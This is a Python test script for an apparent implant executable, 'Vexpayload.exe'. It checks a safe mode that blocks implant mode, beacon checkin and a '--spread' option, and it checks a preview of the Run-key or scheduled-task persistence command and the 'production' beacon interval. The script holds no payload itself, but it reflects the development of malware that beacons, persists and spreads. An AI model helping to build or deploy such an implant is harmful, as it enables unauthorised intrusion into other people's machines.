#!/usr/bin/env python3
"""Harness guard tests: --safe, --persist-preview. No beacon, no payload run.

--safe must refuse implant mode and never reach checkin/persistence.
--persist-preview must print the exact Run/task command and exit 0.
"""

import os
import subprocess
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXE = os.path.join(ROOT, "x64", "Release", "Vexpayload.exe")
CHECKS = []


def ok(name, cond, extra=""):
    CHECKS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + ((" " + str(extra)) if extra else ""))


def run(*args, timeout=60):
    return subprocess.run([EXE, *args], capture_output=True, text=True, encoding="utf-8", errors="replace",
                          timeout=timeout)


def main() -> int:
    if not os.path.exists(EXE):
        print("[-] build first")
        return 2

    r = run("--safe", "--no-elevate")
    ok("--safe refuses implant mode", r.returncode == 2, f"rc={r.returncode}")
    ok("--safe explains", "[safe]" in (r.stdout + r.stderr))

    r = run("--safe", "--persist-preview", "--spread")
    ok("--safe allows harness", r.returncode == 0, f"rc={r.returncode}")
    ok("--safe strips spread from persistence", "--spread" not in r.stdout,
       r.stdout.strip())

    r = run("--persist-preview", "--ping-ms", "2000")
    ok("test cadence not persisted", "--ping-ms" not in r.stdout, r.stdout.strip())

    r = run("--persist-preview", "--ping-ms", "120000")
    ok("production cadence persisted", "--ping-ms 120000" in r.stdout)

    bad = [n for n, s in CHECKS if not s]
    print(f"\n{len(CHECKS) - len(bad)}/{len(CHECKS)} checks passed")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
